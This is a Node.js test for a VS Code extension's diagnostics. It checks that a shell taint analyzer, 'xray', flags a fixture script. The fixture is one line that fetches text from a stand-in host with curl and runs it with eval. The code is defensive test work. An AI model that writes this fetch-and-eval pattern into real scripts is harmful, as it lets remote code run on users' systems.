// node test.js — checks the diagnostics logic against real xray output.
'use strict';
const assert = require('assert');
const { execFileSync } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { taintDiagnostics } = require('./diagnostics');

const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'xray-vscode-'));
const script = path.join(dir, 'install.sh');
fs.writeFileSync(script, '#!/bin/sh\nmsg=$(curl -fsS https://example.invalid/motd)\neval "$msg"\n', { mode: 0o755 });
let out;
try {
  out = execFileSync(process.env.XRAY || 'xray', ['taint', script, '--json']).toString();
} catch (error) {
  out = error.stdout.toString(); // exit 1 means a high finding
}
const report = JSON.parse(out);
const items = taintDiagnostics(report, report.root, false);
assert.strictEqual(items.length, 1);
assert.strictEqual(items[0].line, 2);
assert.strictEqual(items[0].severity, 'Error');
assert.match(items[0].message, /eval of input \(from network; inferred\)/);
console.log('ok:', items[0]);
